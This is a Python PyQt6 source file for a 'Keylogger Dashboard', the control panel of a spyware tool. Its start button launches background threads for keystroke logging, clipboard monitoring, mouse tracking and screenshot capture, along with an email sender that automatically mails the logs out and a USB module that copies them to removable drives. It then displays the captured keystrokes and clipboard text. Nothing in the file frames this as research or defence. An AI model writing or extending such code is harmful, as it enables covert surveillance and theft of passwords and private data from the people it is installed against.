from PyQt6.QtWidgets import (QMainWindow, QTabWidget, QTextEdit, QPushButton, 
                            QVBoxLayout, QWidget, QFileDialog)
from PyQt6.QtCore import QTimer, Qt
import os
import threading
import time
import config  # Changed from direct import
from modules import usb_extractor

class KeyloggerUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.logging = False
        self.init_ui()
        # Get username from path only if available
        title = "Keylogger Dashboard"
        if config.USERNAME:
            title += f" - {config.USERNAME}"
        self.setWindowTitle(title)

    def init_ui(self):
        self.tabs = QTabWidget()
        
        # Keystrokes Tab
        self.keystrokes_tab = QWidget()
        self.keystrokes_view = QTextEdit()
        self.keystrokes_view.setReadOnly(True)
        
        # Clipboard Tab
        self.clipboard_tab = QWidget()
        self.clipboard_view = QTextEdit()
        self.clipboard_view.setReadOnly(True)
        
        # Control Buttons
        self.start_btn = QPushButton("Start Monitoring")
        self.start_btn.clicked.connect(self.start_logging)
        self.stop_btn = QPushButton("Stop Monitoring")
        self.stop_btn.clicked.connect(self.stop_logging)
        self.stop_btn.setEnabled(False)
        
        # Tab setup
        self.tabs.addTab(self.create_tab_layout(self.keystrokes_view), "Keystrokes")
        self.tabs.addTab(self.create_tab_layout(self.clipboard_view), "Clipboard")
        
        main_layout = QVBoxLayout()
        main_layout.addWidget(self.tabs)
        main_layout.addWidget(self.start_btn)
        main_layout.addWidget(self.stop_btn)
        
        container = QWidget()
        container.setLayout(main_layout)
        self.setCentralWidget(container)
        
        # Setup timers
        self.log_timer = QTimer()
        self.log_timer.timeout.connect(self.update_log_views)

    def create_tab_layout(self, widget):
        tab = QWidget()
        layout = QVBoxLayout()
        layout.addWidget(widget)
        tab.setLayout(layout)
        return tab

    def start_logging(self):
        if not self.logging:
            self.logging = True
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            
            # Import modules AFTER config is set
            from modules import (
                keylogger, 
                clipboard_monitor,
                mouse_tracker,
                screenshot_capture,
                email_sender,
                usb_extractor
            )
            
            # Start monitoring threads
            threading.Thread(target=keylogger.start_keylogger, daemon=True).start()
            threading.Thread(target=clipboard_monitor.monitor_clipboard, daemon=True).start()
            threading.Thread(target=mouse_tracker.start_mouse_tracking, daemon=True).start()
            threading.Thread(target=screenshot_capture.capture_screenshot, daemon=True).start()
            threading.Thread(target=email_sender.auto_send_logs, daemon=True).start()
            
            # Start USB monitoring after short delay
            threading.Timer(10, usb_extractor.copy_logs_to_usb).start()
            
            self.log_timer.start(2000)

    def stop_logging(self):
        self.logging = False
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.log_timer.stop()

    def update_log_views(self):
        try:
            from config import LOG_PATH
            
            # Keystrokes
            ks_file = os.path.join(LOG_PATH, "keystrokes.log")
            if os.path.exists(ks_file) and os.path.getsize(ks_file) > 0:
                with open(ks_file, "r", encoding="utf-8") as f:
                    self.keystrokes_view.setText(f.read())
            else:
                self.keystrokes_view.setText("No keystrokes recorded yet")
            
            # Clipboard
            cb_file = os.path.join(LOG_PATH, "clipboard.log")
            if os.path.exists(cb_file) and os.path.getsize(cb_file) > 0:
                with open(cb_file, "r", encoding="utf-8") as f:
                    self.clipboard_view.setText(f.read())
            else:
                self.clipboard_view.setText("No clipboard content captured")

        except Exception as e:
            print(f"UI Update Error: {str(e)}")
            self.keystrokes_view.setText("Error loading logs")
            self.clipboard_view.setText("Error loading logs")

    def usb_monitoring(self):
        from modules.usb_extractor import copy_logs_to_usb
        copy_logs_to_usb()

    def closeEvent(self, event):
        self.stop_logging()
        event.accept()